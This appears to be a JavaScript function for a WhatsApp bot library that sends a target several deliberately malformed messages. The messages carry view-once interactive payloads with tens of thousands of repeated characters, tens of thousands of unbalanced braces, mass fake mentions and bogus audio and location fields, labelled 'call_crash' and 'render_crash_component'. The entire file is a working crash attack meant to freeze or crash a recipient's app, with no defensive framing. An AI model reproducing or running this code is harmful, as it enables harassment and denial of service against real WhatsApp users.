async function UiCallCrashBlank(sock, target) {
  const msgUiCall = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: " 𝐆𝐘𝐙𝐄𝐁 ✦ 𝐇𝐄𝐋𝐋𝐁𝐎𝐘 🦠 🩸 ༑ 𝐆𝐘𝐙𝐄𝐍 ✦ 𝐇𝐄𝐋𝐋𝐁𝐎𝐘 " + "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(target, msgUiCall.message, {
    participant: { jid: target },
    messageId: msgUiCall.key.id
  });

  const spamMention = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
  const teks = "᬴".repeat(250000);

  const callUiMsg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "𝐆𝐘𝐙𝐄𝐍 ✦ 𝐇𝐄𝐋𝐋𝐁𝐎𝐘 " + "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(target, callUiMsg.message, {
    messageId: callUiMsg.key.id,
    participant: { jid: target }
  });
  await sock.sendMessage(target, { text: teks, contextInfo: { mentionedJid: spamMention } });

  const CrashBload = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "⟅ ༑ ▾ 𝐆𝐘𝐙𝐄𝐍 ✦ 𝐇𝐄𝐋𝐋𝐁𝐎𝐘  ༑ ⟅", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            version: 3,
            paramsJson: JSON.stringify({
              trigger: true,
              action: "call_crash",
              note: "🩸 ༑ 𝐆𝐘𝐙𝐄𝐍 ✦ 𝐇𝐄𝐋𝐋𝐁𝐎𝐘 ⟅ ༑ 🩸",
              filler: "꧔".repeat(50000)
            })
          }
        }
      }
    },
    nativeFlowMessage: {
      name: "render_crash_component",
      messageParamsJson: "{".repeat(70000)
    },
    audioMessage: {
      mimetype: "audio/ogg; codecs=opus",
      fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
      fileLength: "9999999999",
      seconds: 999999,
      ptt: true,
      streamingSidecar: "꧔꧈".repeat(9999)
    }
  };
  await sock.relayMessage(target, { message: CrashBload }, { messageId: callUiMsg.key.id });

  const blankContent = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 1,
              expiryTimestamp: null
            }
          },
          externalAdReply: {
            showAdAttribution: false,
            renderLargerThumbnail: true
          },
          header: {
            title: "𝐀𝐗𝐆𝐀𝐍𝐊 • 𝐗-𝐂𝐎𝐑𝐄",
            hasMediaAttachment: false,
            locationMessage: {
              degreesLatitude: 992.999999,
              degreesLongitude: -932.8889989,
              name: "\u900A",
              address: "\u0007".repeat(20000)
            }
          },
          body: { text: "𝐆𝐘𝐙𝐄𝐍 ✦ 𝐇𝐄𝐋𝐋𝐁𝐎𝐘 " },
          interactiveResponseMessage: {
            body: { text: "𝐆𝐘𝐙𝐄𝐍 ✦ 𝐇𝐄𝐋𝐋𝐁𝐎𝐘 ", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              status: true,
              messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
              paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "𝐀𝐌𝐄𝐋𝐈𝐀 ✦ 𝐇𝐄𝐋𝐋𝐁𝐎𝐘 ",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "cyber@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(70000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }`,
              version: 3
            }
          }
        }
      }
    }
  };
  const msgBlank = await generateWAMessageFromContent(target, blankContent, {});
  await sock.relayMessage(target, msgBlank.message, { messageId: msgBlank.key.id });
}